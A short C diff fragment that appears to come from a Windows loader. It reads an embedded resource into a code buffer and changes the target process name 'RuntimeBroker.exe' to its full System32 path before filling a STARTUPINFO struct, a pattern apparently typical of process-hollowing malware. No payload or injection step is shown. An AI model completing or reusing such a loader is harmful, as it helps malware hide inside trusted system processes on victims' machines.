@@ -29,7 +29,7 @@ int main() {
     code199k = (char*)LockResource(resrdata);
     
     
-    const char* processptaah = (LPSTR)"RuntimeBroker.exe";
+    const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";
    
 
     STARTUPINFO li = {0};
